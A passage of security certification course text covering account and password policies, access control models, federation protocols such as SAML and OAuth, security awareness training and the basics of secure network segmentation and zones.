A shared account is one where passwords (or other authentication credentials) are known to more than one person. Typically, simple SOHO networking devices do not allow for the creation of multiple accounts and a single "Admin" account is used to manage the device. These accounts might be configured with a default password. Other examples include the default (or generic) OS accounts, such as Administrator and Guest in Windows or root in Linux, or accounts added to default security groups. Shared accounts may also be set up for temporary staff.

A shared account breaks the principle of non-repudiation and makes an accurate audit trail difficult to establish. It makes it more likely that the password for the account will be compromised. The other major risk involves password changes to an account. Since frequent password changing is a common policy, organizations will need to ensure that everyone who has access to an account knows when the password will change, and what that new password will be. This necessitates distributing passwords to a large group of people, which itself poses a significant challenge to security. Shared accounts should only be used where these risks are understood and accepted.
### Credential Policies for Devices
Network appliances designed for enterprise use are unlikely to be restricted to a single default account, and will use TACACS+ to support individual accounts and role-based permissions. If a device can only be operated with a shared password, ensure separation of duties to ensure the device remains in an authorized configuration.
### Privilege Access Management
Even with the most carefully designed role-based permissions, it is almost impossible to eliminate use of shared/device/root passwords completely. Enterprise privilege access management products provide a solution for storing these high-risk credentials somewhere other than a spreadsheet and for auditing elevated privileges generally ([gartner.com/reviews/market/privileged-access-management](https://www.gartner.com/reviews/market/privileged-access-management)). 

SECURE SHELL KEYS AND THIRD-PARTY CREDENTIALS

Secure Shell (SSH) is a widely used remote access protocol. It is very likely to be used to manage devices and services. SSH uses two types of key pairs:

- A host key pair identifies an SSH server. The server reveals the public part when a client connects to it. The client must use some means of determining the validity of this public key. If accepted, the key pair is used to encrypt the network connection and start a session.
- A user key pair is a means for a client to login to an SSH server. The server stores a copy of the client's public key. The client uses the linked private key to generate an authentication request and sends the request (not the private key) to the server. The server can only validate this request if the correct public key is held for that client.

SSH keys have often not been managed very well, leading to numerous security breaches, most infamously the Sony hack ([ssh.com/malware](https://www.ssh.com/malware/)). There are vendor solutions for SSH key management or you can configure servers and clients to use public key infrastructure (PKI) and certificate authorities (CAs) to validate identities.

A third-party credential is one used by your company to manage a vendor service or cloud app. As well as administrative logons, devices and services may be configured with a password or cryptographic keys to access hosts via SSH or via an application programming interface (API). Improper management of these secrets, such as including them in code or scripts as plaintext, has been the cause of many breaches ([nakedsecurity.sophos.com/2019/03/25/thousands-of-coders-are-leaving-their-crown-jewels-exposed-on-github](https://nakedsecurity.sophos.com/2019/03/25/thousands-of-coders-are-leaving-their-crown-jewels-exposed-on-github/)).


Topic 8B: Implement Account Policies

Account policies enforce the privilege management policy by setting what users can and cannot do. This helps you to enforce strong credential policies and to detect and manage risks from compromised accounts. Auditing and permission reviews can reveal suspicious behavior and attempts to break through security.

ACCOUNT ATTRIBUTES AND ACCESS POLICIES

As well as authenticating the user, an account can be configured with attributes as a user profile. Account objects can also be used to assign permissions and access policies.
### Account Attributes
A user account is defined by a unique security identifier (SID), a name, and a credential. Each account is associated with a profile. The profile can be defined with custom identity attributes describing the user, such as a full name, email address, contact number, department, and so on. The profile may support media, such as an account picture.

As well as attributes, the profile will usually provide a location for storing user-generated data files (a home folder). The profile can also store per-account settings for software applications. 
### Access Policies 
Each account can be assigned permissions over files and other network resources and access policies or privileges over the use and configuration of network hosts. These permissions might be assigned directly to the account or inherited through membership of a security group or role. Access policies determine things like the right to log on to a computer locally or via remote desktop, install software, change the network configuration, and so on.

On a Windows Active Directory network, access policies can be configured via group policy objects (GPOs). GPOs can be used to configure access rights for user/group/role accounts. GPOs can be linked to network administrative boundaries in Active Directory, such as sites, domains, and Organizational Units (OU). 

ACCOUNT PASSWORD POLICY SETTINGS 

System-enforced account policies can help to enforce credential management principles by stipulating requirements for user-selected passwords:

- Password length—enforces a minimum length for passwords. There may also be a maximum length.
- Password complexity—enforces password complexity rules (that is, no use of username within password and combination of at least eight upper/lower case alpha-numeric and non-alpha-numeric characters).
- Password aging—forces the user to select a new password after a set number of days.
- Password reuse and history—prevents the selection of a password that has been used already. The history attribute sets how many previous passwords are blocked.

In this context, you should note that the most recent guidance issued by NIST ([nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/NIST.SP.800-63b.pdf)) deprecates some of the "traditional" elements of password policy:

- Complexity rules should not be enforced. The user should be allowed to choose a password (or other memorized secret) of between 8 and 64 ASCII or UNICODE characters, including spaces. The only restriction should be to block common passwords, such as dictionary words, repetitive strings (like 12345678), strings found in breach databases, and strings that repeat contextual information, such as username or company name.
- Aging policies should not be enforced. Users should be able to select if and when a password should be changed, though the system should be able to force a password change if compromise is detected.
- Password hints should not be used. A password hint allows account recovery by submitting responses to personal information, such as first school or pet name. 

One approach to a password hint is to treat it as a secondary password and submit a random but memorable phrase, rather than an "honest" answer. The risk in allowing password hints is demonstrated by the data recovered in the Adobe data breach ([nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)).

ACCOUNT RESTRICTIONS

To make the task of compromising the user security system harder, account restrictions can be used. 
### Location-Based Policies
A user or device can have a logical network location, identified by an IP address, subnet, virtual LAN (VLAN), or organizational unit (OU). This can be used as an account restriction mechanism. For example, a user account may be prevented from logging on locally to servers within a restricted OU.

The geographical location of a user or device can also be calculated using a geolocation mechanism. There are several types of geolocation:

- IP address—these can be associated with a map location to varying degrees of accuracy based on information published by the registrant, including name, country, region, and city. The registrant is usually the Internet service provider (ISP), so the information you receive will provide an approximate location of a host based on the ISP. If the ISP is one that serves a large or diverse geographical area, you will be less likely to pinpoint the location of the host Internet service providers (ISPs). Software libraries, such as GeoIP ([maxmind.com/en/geoip-demo](https://www.maxmind.com/en/geoip-demo)), facilitate querying this data.
- Location Services—these are methods used by the OS to calculate the device's geographical position. A device with a global positioning system (GPS) sensor can report a highly accurate location when outdoors. Location services can also triangulate to cell towers, Wi-Fi hotspots, and Bluetooth signals where GPS is not supported.

Geofencing refers to accepting or rejecting access requests based on location. Geofencing can also be used for push notification to send alerts or advice to a device when a user enters a specific area. Geotagging refers to the addition of location metadata to files or devices. This is often used for asset management to ensure devices are kept with the proper location. 
### Time-Based Restrictions
There are three main types of time-based policies:

- A time of day policy establishes authorized logon hours for an account.
- A time-based login policy establishes the maximum amount of time an account may be logged in for.
- An impossible travel time/risky login policy tracks the location of login events over time. If these do not meet a threshold, the account will be disabled. For example, a user logs in to an account from a device in New York. A couple of hours later, a login attempt is made from LA, but this is refused and an alert raised because it is not feasible for the user to be in both locations.

ACCOUNT AUDITS

Accounting and auditing processes are used to detect whether an account has been compromised or is being misused. A security or audit log can be used to facilitate detection of account misuse:

- Accounting for all actions that have been performed by users. Change and version control systems depend on knowing when a file has been modified and by whom. Accounting also provides for non-repudiation (that is, a user cannot deny that they accessed or made a change to a file). The main problems are that auditing successful access attempts can quickly consume a lot of disk space, and analyzing the logs can be very time-consuming.
- Detecting intrusions or attempted intrusions. Here records of failure-type events are likely to be more useful, though success-type events can also be revealing if they show unusual access patterns.

Account auditing also refers to more general change control. You need to take account of changes to resources and users. Resources may be updated, archived, or have their clearance level changed. Users may leave, arrive, or change jobs (roles). For example, if a user has moved to a new job, old privileges may need to be revoked and new ones granted. This process is referred to as recertification. Managing these sorts of changes efficiently and securely requires effective standard operating procedures (SOPs) and clear and timely communication between departments (between IT and HR, for instance).

ACCOUNT PERMISSIONS

Where many users, groups, roles, and resources are involved, managing account permissions is complex and time-consuming. Improperly configured accounts can have two different types of impact. On the one hand, setting privileges that are too restrictive creates a large volume of support calls and reduces productivity. On the other hand, granting too many privileges to users weakens the security of the system and increases the risk of things like malware infection and data breach.

The phrase "authorization creep" refers to an employee who gains more and more access privileges the longer they remain with the organization.

A user may be granted elevated privileges temporarily (escalation). In this case, some system needs to be in place to ensure that the privileges are revoked at the end of the agreed period.

A system of auditing needs to be put in place so that privileges are reviewed regularly. Auditing would include monitoring group membership and reviewing access control lists for each resource plus identifying and disabling unnecessary accounts.

USAGE AUDITS 

Usage auditing means configuring the security log to record key indicators and then reviewing the logs for suspicious activity. Determining what to log is one of the most considerable challenges a network administrator can face. For Active Directory, Microsoft has published audit policy recommendations for baseline requirements and networks with stronger security requirements ([docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations)). Some typical categories include:

- Account logon and management events.
- Process creation.
- Object access (file system/file shares).
- Changes to audit policy.
- Changes to system security and integrity (antivirus, host firewall, and so on).

ACCOUNT LOCKOUT AND DISABLEMENT 

If account misuse is detected or suspected, the account can be manually disabled by setting an account property. This prevents the account from being used for login. Note that disabling the account does not close existing sessions. You can issue a remote logoff command to close a session. Account disablement means that login is permanently prevented until an administrator manually re-enables the account.

An account lockout means that login is prevented for a period. This might be done manually if a policy violation is detected, but there are several scenarios for automatically applying a lockout:

- An incorrect account password is entered repeatedly.
- The account is set to expire. Setting an account expiration date means that an account cannot be used beyond a certain date. This option is useful on accounts for temporary and contract staff.
- When using time- or location-based restrictions, the server periodically checks whether the user has the right to continue using the network. If the user does not have the right, then an automatic logout procedure commences.

Topic 8C: Implement Authorization Solutions

Implementing an effective authorization solution system requires understanding of the different models that such systems can be based on. While an on-premises network can use a local directory to manage accounts and rights, as organizations move services to the cloud, these authorizations have to be implemented using federated identity management solutions.

DISCRETIONARY AND ROLE-BASED ACCESS CONTROL

An important consideration in designing a security system is to determine how users receive rights or permissions. The different models are referred to as access control schemes.
### Discretionary Access Control (DAC)
Discretionary access control (DAC) is based on the primacy of the resource owner. The owner is originally the creator of a file or service, though ownership can be assigned to another user. The owner is granted full control over the resource, meaning that he or she can modify its access control list (ACL) to grant rights to others.

DAC is the most flexible model and is currently implemented widely in terms of computer and network security. In terms of file system security, it is the model used by default for most UNIX/Linux distributions and by Microsoft Windows. As the most flexible model, it is also the weakest because it makes centralized administration of security policies the most difficult to enforce. It is also the easiest to compromise, as it is vulnerable to insider threats and abuse of compromised accounts.
### Role-Based Access Control (RBAC)
Role-based access control (RBAC) adds an extra degree of centralized control to the DAC model. Under RBAC, a set of organizational roles are defined, and subjects allocated to those roles. Under this system, the right to modify roles is reserved to a system owner. Therefore, the system is non-discretionary, as each subject account has no right to modify the ACL of a resource, even though they may be able to change the resource in other ways. Users are said to gain rights implicitly (through being assigned to a role) rather than explicitly (being assigned the right directly).

RBAC can be partially implemented through the use of security group accounts, but they are not identical schemes. Membership of security groups is largely discretionary (assigned by administrators, rather than determined by the system). Also, ideally, a subject should only inherit the permissions of a role to complete a particular task rather than retain them permanently.

FILE SYSTEM PERMISSIONS 

An access control model can be applied to any type of data or software resource but is most closely associated with network, file system, and database security. With file system security, each object in the file system has an ACL associated with it. The ACL contains a list of accounts (principals) allowed to access the resource and the permissions they have over it. Each record in the ACL is called an access control entry (ACE). The order of ACEs in the ACL is important in determining effective permissions for a given account. ACLs can be enforced by a file system that supports permissions, such as NTFS, ext3/ext4, or ZFS.

MANDATORY AND ATTRIBUTE-BASED ACCESS CONTROL

The DAC and RBAC models expose privileged accounts to the threat of compromise. More restrictive access control models can be used to mitigate this threat.
### Mandatory Access Control (MAC)
Mandatory access control (MAC) is based on the idea of security clearance levels. Rather than defining ACLs on resources, each object and each subject is granted a clearance level, referred to as a label. If the model used is a hierarchical one (that is, high clearance users are trusted to access low clearance objects), subjects are only permitted to access objects at their own clearance level or below.

The labelling of objects and subjects takes place using pre-established rules. The critical point is that these rules cannot be changed by any subject account, and are therefore non-discretionary. Also, a subject is not permitted to change an object's label or to change his or her own label.
### Attribute-Based Access Control (ABAC)
Attribute-based access control (ABAC) is the most fine-grained type of access control model. As the name suggests, an ABAC system is capable of making access decisions based on a combination of subject and object attributes plus any context-sensitive or system-wide attributes. As well as group/role memberships, these attributes could include information about the OS currently being used, the IP address, or the presence of up-to-date patches and anti-malware. An attribute-based system could monitor the number of events or alerts associated with a user account or with a resource, or track access requests to ensure they are consistent in terms of timing of requests or geographic location. It could be programmed to implement policies, such as M-of-N control and separation of duties.

RULE-BASED ACCESS CONTROL

Rule-based access control is a term that can refer to any sort of access control model where access control policies are determined by system-enforced rules rather than system users. As such, RBAC, ABAC, and MAC are all examples of rule-based (or non-discretionary) access control. As well as the formal models, rule-based access control principles are increasingly being implemented to protect computer and network systems founded on discretionary access from the sort of misconfiguration that can occur through DAC.
### Conditional Access
Conditional access is an example of rule-based access control. A conditional access system monitors account or device behavior throughout a session. If certain conditions are met, the account may be suspended or the user may be required to reauthenticate, perhaps using a 2-step verification method. The User Account Control (UAC) and sudo restrictions on privileged accounts are examples of conditional access. The user is prompted for confirmation or authentication when requests that require elevated privileges are made. Role-based rights management and ABAC systems can apply a number of criteria to conditional access, including location-based policies ([docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)).
### Privileged Access Management
A privileged account is one that can make significant configuration changes to a host, such as installing software or disabling a firewall or other security system. Privileged accounts also have rights to log on network appliances and application servers.

Privileged access management (PAM) refers to policies, procedures, and technical controls to prevent the malicious abuse of privileged accounts and to mitigate risks from weak configuration control over privileges. These controls identify and document privileged accounts, giving visibility into their use, and manage the credentials used to access them ([beyondtrust.com/resources/glossary/privileged-access-management-pam](https://www.beyondtrust.com/resources/glossary/privileged-access-management-pam)). 

DIRECTORY SERVICES

Directory services are the principal means of providing privilege management and authorization on an enterprise network, storing information about users, computers, security groups/roles, and services. A directory is like a database, where an object is like a record, and things that you know about the object (attributes) are like fields. In order for products from different vendors to be interoperable, most directories are based on the same standard. The Lightweight Directory Access Protocol (LDAP) is a protocol widely used to query and update X.500 format directories. 

A distinguished name (DN) is a unique identifier for any given resource within an X.500-like directory. A distinguished name is made up of attribute=value pairs, separated by commas. The most specific attribute is listed first, and successive attributes become progressively broader. This most specific attribute is also referred to as the relative distinguished name, as it uniquely identifies the object within the context of successive (parent) attribute values.

The types of attributes, what information they contain, and the way object types are defined through attributes (some of which may be required, and some optional) is described by the directory schema. Some of the attributes commonly used include common name (CN), organizational unit (OU), organization (O), country (C), and domain component (DC). 

FEDERATION AND ATTESTATION

An on-premises network can use technologies such as LDAP and Kerberos, very often implemented as a Windows Active Directory network, because the administration of accounts and devices can be centralized. Expanding this type of network to share resources with business partners or use services in public clouds means implementing some type of federation technology.
### Federation
Federation is the notion that a network needs to be accessible to more than just a well-defined group of employees. In business, a company might need to make parts of its network open to partners, suppliers, and customers. The company can manage its employee accounts easily enough. Managing accounts for each supplier or customer internally may be more difficult. Federation means that the company trusts accounts created and managed by a different network. As another example, in the consumer world, a user might want to use both Google Apps and Twitter. If Google and Twitter establish a federated network for the purpose of authentication and authorization, then the user can log on to Twitter using his or her Google credentials or vice versa.
### Identity Providers and Attestation
In these models, the networks perform federated identity management. A user from one network is able to provide attestation that proves their identity. In very general terms, the process is similar to that of Kerberos authorization, and works as follows:

1. The user (principal) attempts to access a service provider (SP), or the relying party (RP). The service provider redirects the principal to the identity provider (IdP) to authenticate.
1. The principal authenticates with the identity provider and obtains an attestation of identity, in the form of some sort of token or document signed by the IdP.
1. The principal presents the attestation to the service provider. The SP can validate that the IdP has signed the attestation because of its trust relationship with the IdP.
1. The service provider can now connect the authenticated principal to its own accounts database. It may be able to query attributes of the user account profile held by the IdP, if the principal has authorized this type of access.
### Cloud versus On-Premises Requirements 
Where a company needs to make use of cloud services or share resources with business partner networks, authentication and authorization design comes with more constraints and additional requirements. Web applications might not support Kerberos, while third-party networks might not support direct federation with Active Directory/LDAP. The design for these cloud networks is likely to require the use of standards for performing federation and attestation between web applications.

SECURITY ASSERTION MARKUP LANGUAGE 

A federated network or cloud needs specific protocols and technologies to implement user identity assertions and transmit attestations between the principal, the relying party, and the identity provider. Security Assertion Markup Language (SAML) is one such solution. SAML attestations (or authorizations) are written in eXtensible Markup Language (XML). Communications are established using HTTP/HTTPS and the Simple Object Access Protocol (SOAP). These secure tokens are signed using the XML signature specification. The use of a digital signature allows the relying party to trust the identity provider.

As an example of a SAML implementation, Amazon Web Services (AWS) can function as a SAML service provider. This allows companies using AWS to develop cloud applications to manage their customers' user identities and provide them with permissions on AWS without having to create accounts for them on AWS directly.

OAUTH AND OPENID CONNECT

Many public clouds use application programming interfaces (APIs) based on Representational State Transfer (REST) rather than SOAP. These are often called RESTful APIs. Where SOAP is a tightly specified protocol, REST is a looser architectural framework. This allows the service provider more choice over implementation elements. Compared to SOAP and SAML, there is better support for mobile apps. 
### OAuth
Authentication and authorization for a RESTful API is often implemented using the Open Authorization (OAuth) protocol. OAuth is designed to facilitate sharing of information (resources) within a user profile between sites. The user creates a password-protected account at an identity provider (IdP). The user can use that account to log on to an OAuth consumer site without giving the password to the consumer site. A user (resource owner) can grant a client an authorization to access some part of their account. A client in this context is an app or consumer site.

The user account is hosted by one or more resource servers. A resource server is also called an API server because it hosts the functions that allow clients (consumer sites and mobile apps) to access user attributes. Authorization requests are processed by an authorization server. A single authorization server can manage multiple resource servers; equally the resource and authorization server could be the same server instance.

The client app or service must be registered with the authorization server. As part of this process, the client registers a redirect URL, which is the endpoint that will process authorization tokens. Registration also provides the client with an ID and a secret. The ID can be publicly exposed, but the secret must be kept confidential between the client and the authorization server. When the client application requests authorization, the user approves the authorization server to grant the request using an appropriate method. OAuth supports several grant types—or flows—for use in different contexts, such as server to server or mobile app to server. Depending on the flow type, the client will end up with an access token validated by the authorization server. The client presents the access token to the resource server, which then accepts the request for the resource if the token is valid.

OAuth uses the JavaScript object notation (JSON) web token (JWT) format for claims data. JWTs can easily be passed as Base64-encoded strings in URLs and HTTP headers and can be digitally signed for authentication and integrity.
### OpenID Connect (OIDC)
OAuth is explicitly designed to authorize claims and not to authenticate users. The implementation details for fields and attributes within tokens are not defined. There is no mechanism to validate that a user who initiated an authorization request is still logged on and present. The access token once granted has no authenticating information. Open ID Connect (OIDC) is an authentication protocol that can be implemented as special types of OAuth flows with precisely defined token fields.

Topic 8D: Explain the Importance of Personnel Polices

As well as implementing technical controls for identity and account management, you will need to make sure that your personnel follow appropriate security procedures and policies. The human element can represent a significant attack surface, especially when social engineering attacks are involved. As a security professional, you will work with a human resources (HR) department to assist with the formulation of policies and the development and delivery of security awareness and training programs.

CONDUCT POLICIES 

Operational policies include privilege/credential management, data handling, and incident response. Other important security policies include those governing employee conduct and respect for privacy.
### Acceptable Use Policy 
Enforcing an acceptable use policy (AUP) is important to protect the organization from the security and legal implications of employees misusing its equipment. Typically, the policy will forbid the use of equipment to defraud, to defame, or to obtain illegal material. It will prohibit the installation of unauthorized hardware or software and explicitly forbid actual or attempted snooping of confidential data that the employee is not authorized to access. Acceptable use guidelines must be reasonable and not interfere with employees' fundamental job duties or privacy rights. An organization's AUP may forbid use of Internet tools outside of work-related duties or restrict such use to break times.
### Code of Conduct and Social Media Analysis 
A code of conduct, or rules of behavior, sets out expected professional standards. For example, employees' use of social media and file sharing poses substantial risks to the organization, including threat of virus infection or systems intrusion, lost work time, copyright infringement, and defamation. Users should be aware that any data communications, such as email, made through an organization's computer system are likely stored within the system, on servers, backup devices, and so on. Such communications are also likely to be logged and monitored. Employers may also subject employees' personal social media accounts to analysis and monitoring, to check for policy infringements.

Rules of behavior are also important when considering employees with privileged access to computer systems. Technicians and managers should be bound by clauses that forbid them from misusing privileges to snoop on other employees or to disable a security mechanism.
### Use of Personally Owned Devices in the Workplace
Portable devices, such as smartphones, USB sticks, media players, and so on, pose a considerable threat to data security, as they make file copy so easy. Camera and voice recording functions are other obvious security issues. Network access control, endpoint management, and data loss prevention solutions can be of some use in preventing the attachment of such devices to corporate networks. Some companies may try to prevent staff from bringing such devices on site. This is quite difficult to enforce, though.

Also important to consider is the unauthorized use of personal software by employees or employees using software or services that has not been sanctioned for a project (shadow IT). Personal software may include either locally installed software or hosted applications, such as personal email or instant messenger, and may leave the organization open to a variety of security vulnerabilities. Such programs may provide a route for data exfiltration, a transport mechanism for malware, or possibly software license violations for which the company might be held liable, just to name a few of the potential problems.
### Clean Desk Policy 
A clean desk policy means that each employee's work area should be free from any documents left there. The aim of the policy is to prevent sensitive information from being obtained by unauthorized staff or guests at the workplace.

USER AND ROLE-BASED TRAINING

Another essential component of a secure system is effective user training. Untrained users represent a serious vulnerability because they are susceptible to social engineering and malware attacks and may be careless when handling sensitive or confidential data.

Appropriate security awareness training needs to be delivered to employees at all levels, including end users, technical staff, and executives. Some of the general topics that need to be covered include the following:

- Overview of the organization's security policies and the penalties for non-compliance.
- Incident identification and reporting procedures.
- Site security procedures, restrictions, and advice, including safety drills, escorting guests, use of secure areas, and use of personal devices.
- Data handling, including document confidentiality, PII, backup, encryption, and so on.
- Password and account management plus security features of PCs and mobile devices.
- Awareness of social engineering and malware threats, including phishing, website exploits, and spam plus alerting methods for new threats.
- Secure use of software such as browsers and email clients plus appropriate use of Internet access, including social networking sites.

There should also be a system for identifying staff performing security-sensitive roles and grading the level of training and education required (between beginner, intermediate, and advanced, for instance). Note that in defining such training programs you need to focus on job roles, rather than job titles, as employees may perform different roles and have different security training, education, or awareness requirements in each role.

DIVERSITY OF TRAINING TECHNIQUES

It is necessary to frame security training in language that end users will respond to. Education should focus on responsibilities and threats that are relevant to users. It is necessary to educate users about new or emerging threats (such as fileless malware, phishing scams, or zero-day exploits in software), but this needs to be stated in language that users understand.

Using a diversity of training techniques helps to improve engagement and retention. Training methods include facilitated workshops and events, one-on-one instruction and mentoring, plus resources such as computer-based or online training, videos, books, and blogs/newsletters.
### Phishing Campaigns
A phishing campaign training event means sending simulated phishing messages to users. Users that respond to the messages can be targeted for follow-up training.
### Capture the Flag
Capture the Flag (CTF) is usually used in ethical hacker training programs and gamified competitions. Participants must complete a series of challenges within a virtualized computing environment to discover a flag. The flag will represent either threat actor activity (for blue team exercises) or a vulnerability (for red team exercises) and the participant must use analysis and appropriate tools to discover it. Capturing the flag allows the user to progress to the next level and start a new challenge. Once the participant has passed the introductory levels, they will join a team and participate in a competitive event, where there are multiple flags embedded in the environment and capturing them wins points for the participant and for their team.
### Computer-Based Training and Gamification
Participants respond well to the competitive challenge of CTF events. This type of gamification can be used to boost security awareness for other roles too. Computer-based training (CBT) allows a student to acquire skills and experience by completing various types of practical activities:

- Simulations—recreating system interfaces or using emulators so students can practice configuration tasks.
- Branching scenarios—students choose between options to find the best choices to solve a cybersecurity incident or configuration problem.

CBT might use video game elements to improve engagement. For example, students might win badges and level-up bonuses such as skills or digitized loot to improve their in-game avatar. Simulations might be presented so that the student chooses encounters from a map and engages with a simulation environment in a first person shooter type of 3D world.



Lesson 9: Implementing Secure Network Designs

Topic 9A: Implement Secure Network Designs

SECURE NETWORK DESIGNS

A secure network design provisions the assets and services underpinning business workflows with the properties of confidentiality, integrity, and availability. Weaknesses in the network architecture make it more susceptible to undetected intrusions or to catastrophic service failures. Typical weaknesses include:

- Single points of failure—a "pinch point" relying on a single hardware server or appliance or network channel.
- Complex dependencies—services that require many different systems to be available. Ideally, the failure of individual systems or services should not affect the overall performance of other network services.
- Availability over confidentiality and integrity—often it is tempting to take "shortcuts" to get a service up and running. Compromising security might represent a quick fix but creates long term risks.
- Lack of documentation and change control—network segments, appliances, and services might be added without proper change control procedures, leading to a lack of visibility into how the network is constituted. It is vital that network managers understand business workflows and the network services that underpin them.
- Overdependence on perimeter security—if the network architecture is "flat" (that is, if any host can contact any other host), penetrating the network edge gives the attacker freedom of movement.

Cisco's SAFE architecture ([cisco.com/c/en/us/solutions/enterprise/design-zone-security/landing_safe.html#~overview](https://www.cisco.com/c/en/us/solutions/enterprise/design-zone-security/landing_safe.html#~overview)) is a good starting point for understanding the complex topic of network architecture design. The SAFE guidance refers to places in the network (PIN). These represent types of network locations, including campus networks, branch offices, data centers, and the cloud. There are two special locations in these networks—Internet Edge and WAN—that facilitate connections between locations and with untrusted networks.

Each PIN can be protected with security controls and capabilities, classified into a series of secure domains, such as threat defense, segmentation, security intelligence, and management. 

BUSINESS WORKFLOWS AND NETWORK ARCHITECTURE

Network architecture is designed to support business workflows. You can illustrate the sorts of decisions that need to be made by analyzing a simple workflow, such as email:

- Access—the client device must access the network, obtaining a physical channel and logical address. The user must be authenticated and authorized to use the email application. The corollary is that unauthorized users and devices must be denied access.
- Email mailbox server—ensure that the mailbox is only accessed by authorized clients and that it is fully available and fault tolerant. Ensure that the email service runs with a minimum number of dependencies and that the service is designed to be resilient to faults.
- Mail transfer server—this must connect with untrusted Internet hosts, so communications between the untrusted network and trusted LAN must be carefully controlled. Any data or software leaving or entering the network must be subject to policy-based controls.

You can see that this type of business flow will involve systems in different places in the network. Placing the client, the mailbox, and the mail transfer server all within the same logical network "segment" will introduce many vulnerabilities. Understanding and controlling how data flows between these locations is a key part of secure and effective network design. 

NETWORK APPLIANCES

A number of network appliances are involved in provisioning a network architecture:

- Switches—forward frames between nodes in a cabled network. Switches work at layer 2 and 3 of the OSI model. At layer 2 they make forwarding decisions based on the hardware or Media Access Control (MAC) address of attached nodes. Switches can establish network segments that either map directly to the underlying cabling or logical segments, created in the switch configuration as  virtual LANs (VLANs).

When designing and troubleshooting a network, it is helpful to compartmentalize functions to discrete layers. The Open Systems Interconnection (OSI) model is a widely quoted example of how to define layers of network functions.

- Wireless access points—provide a bridge between a cabled network and wireless clients, or stations. Access points work at layer 2 of the OSI model.
- Routers—forward packets around an internetwork, making forwarding decisions based on IP addresses. Routers work at layer 3 of the OSI model. Routers can apply logical IP subnet addresses to segments within a network.
- Firewalls—apply an access control list (ACL) to filter traffic passing in or out of a network segment. Firewalls can work at layer 3 of the OSI model or higher.
- Load balancers—distribute traffic between network segments or servers to optimize performance. Load balancers can work at layer 4 of the OSI model or higher.
- Domain Name System (DNS) servers—host name records and perform name resolution to allow applications and users to address hosts and services using fully qualified domain names (FQDNs) rather than IP addresses. DNS works at layer 7 of the OSI model. Name resolution is a critical service in network design. Abuse of name resolution is a common attack vector.

ROUTING AND SWITCHING PROTOCOLS

The basic function of a network is to forward traffic from one node to another. A number of routing and switching protocols are used to implement forwarding. The forwarding function takes place at two different layers:

- Layer 2 forwarding occurs between nodes on the same local network segment that are all in the same broadcast domain. At layer 2, a broadcast domain is either all the nodes connected to the same physical unmanaged switch, or all the nodes within a virtual LAN (VLAN) configured on one or more managed switches. At layer 2, each node is identified by the network interface's hardware or Media Access Control (MAC) address. A MAC address is a 48-bit value written in hexadecimal notation, such as 00-15-5D-F4-83-48.
- Layer 3 forwarding, or routing, occurs between both logically and physically defined networks. A single network divided into multiple logical broadcast domains is said to be subnetted. Multiple networks joined by routers form an internetwork. At layer 3, nodes are identified by an Internet Protocol (IP) address.
### Address Resolution Protocol (ARP)
The Address Resolution Protocol (ARP) maps a network interface's hardware (MAC) address to an IP address. Normally a device that needs to send a packet to an IP address but does not know the receiving device's MAC address broadcasts an ARP Request packet, and the device with the matching IP responds with an ARP Reply.
### Internet Protocol (IP)
IP provides the addressing mechanism for logical networks and subnets. A 32-bit IPv4 address is written in dotted decimal notation, with either a network suffix or subnet mask to divide the address into network ID and host ID portions. For example, in the IP address 172.16.1.101/16, the /16 suffix indicates that the first half of the address (172.16.0.0) is the network ID, while the remainder uniquely identifies a host on that network. This /16 suffix can also be written as a subnet mask in the form 255.255.0.0.

Networks also use 128-bit IPv6 addressing. IPv6 addresses are written using hex notation in the general format: 2001:db8::abc:0:def0:1234. In IPv6, the last 64-bits are fixed as the host's interface ID. The first 64-bits contain network information in a set hierarchy. For example, an ISP's routers can use the first 48-bits to determine where the network is hosted on the global Internet. Within that network, the site administrator can use the 16 bits remaining (out of 64) to divide the local network into subnets.
### Routing Protocols
Information about how to reach individual networks within an internetwork is processed by routers, which store the data in a routing table. A route to a network can be configured statically, but most networks use routing protocols to transmit new and updated routes between routers. Some common routing protocols include Border Gateway Protocol (BGP), Open Shortest Path First (OSPF), Enhanced Interior Gateway Routing Protocol (EIGRP), and Routing Information Protocol (RIP).

NETWORK SEGMENTATION 

A network segment is one where all the hosts attached to the segment can use local (layer 2) forwarding to communicate freely with one another. The hosts are said to be within the same broadcast domain. Segregation means that the hosts in one segment are restricted in the way they communicate with hosts in other segments. They might only be able to communicate over certain network ports, for instance.

﻿"Freely" means that no network appliances or policies are preventing communications. Each host may be configured with access rules or host firewalls or other security tools to prevent access, but the "view from the network" is that hosts in the same segment are all free to attempt to communicate.

Assuming an Ethernet network, network segments can be established physically by connecting all the hosts in one segment to one switch and all the hosts in another segment to another switch. The two switches can be connected by a router and the router can enforce network policies or access control lists (ACL) to restrict communications between the two segments.

Because enterprise networks typically feature hundreds of switching appliances and network ports (not to mention wireless access and remote access), segmentation is more likely to be enforced using virtual LANs (VLANs). Any given switch port can be assigned to any VLAN in the same topology, regardless of the physical location of the switch. The segmentation enforced by VLANs at layer 2 can be mapped to logical divisions enforced by IP subnets at layer 3.

NETWORK TOPOLOGY AND ZONES 

Given the ability to create segregated segments with the network, you can begin to define a topology of different network zones. A topology is a description of how a computer network is physically or logically organized. The logical and physical network topology should be analyzed to identify points of vulnerability and to ensure that the goals of confidentiality, integrity, and availability are met by the design.

The main building block of a security topology is the zone. A zone is an area of the network where the security configuration is the same for all hosts within it. Zones should be segregated from one another by physical and/or logical segmentation, using VLANs and subnets. Traffic between zones should be strictly controlled using a security device, typically a firewall.

Dividing a campus network or data center into zones implies that each zone has a different security configuration. The main zones are as follows:

- Intranet (private network)—this is a network of trusted hosts owned and controlled by the organization. Within the intranet, there may be sub-zones for different host groups, such as servers, employee workstations, VoIP handsets, and management workstations.

Hosts are trusted in the sense that they are under your administrative control and subject to the security mechanisms (antivirus software, user rights, software updating, and so on) that you have set up to defend the network.

- Extranet—this is a network of semi-trusted hosts, typically representing business partners, suppliers, or customers. Hosts must authenticate to join the extranet.
